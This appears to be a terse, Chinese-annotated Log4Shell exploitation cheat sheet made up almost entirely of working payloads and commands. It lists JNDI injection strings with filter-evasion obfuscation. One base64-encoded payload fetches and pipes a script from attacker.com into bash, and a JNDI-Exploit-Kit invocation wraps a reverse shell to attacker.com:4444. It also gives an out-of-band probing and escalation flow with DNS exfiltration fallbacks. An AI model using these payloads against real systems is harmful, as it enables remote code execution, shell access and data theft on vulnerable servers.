

   ```
   ${jndi:ldap://abc123.dnslog.cn/x}
   ```
   ```bash
   ```
   ```
   ${jndi:ldap://attacker.com:1389/Basic/Command/base64/Y3VybCBodHRwOi8vYXR0YWNrZXIuY29tL3NofGJhc2g=}
   ```


```text
${jndi:ldap://x.dnslog.cn/a}                    # 基础
${${::-j}ndi:ldap://x.dnslog.cn/a}              # 嵌套
${${lower:j}ndi:ldap://x.dnslog.cn/a}           # lower
${${upper:j}ndi:ldap://x.dnslog.cn/a}           # upper
${${env:NaN:-j}ndi:ldap://x.dnslog.cn/a}        # env fallback
${jndi:${lower:l}${lower:d}a${lower:p}://...}   # 极致拆字
${jndi:dns://x.dnslog.cn}                       # DNS 通道
${jndi:rmi://attacker.com:1099/a}               # RMI 替代 LDAP
```


```bash
interactsh-client -v
# 输出：abc123.oast.online ← 用这个域名替换 payload 里的 dnslog
```


```bash
java -jar JNDI-Exploit-Kit-1.0-SNAPSHOT-all.jar \
  -L attacker.com:1389 \
  -P attacker.com:8888 \
  -C 'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tlci5jb20vNDQ0NCAwPiYx}|{base64,-d}|bash'
# 输出多条可用 payload，挑一条插到目标
```


```text
1. 多字段批量发 ${jndi:ldap://oob/a} → 看 OOB 平台有无回连
2. 有回连 → 起本地 gadget LDAP（不依赖远程类加载）→ 推 payload
3. 无回连 → 切 DNS 通道做带外数据外带
```


```text
- DNSLog 收到回连但 LDAP 不通 → JDK 高版本，必走本地 gadget
- DNS 都不通 → 内网 OOB / 二阶反射（先打能出网的二级系统）
- 命令带特殊字符不响应 → base64 包装
```
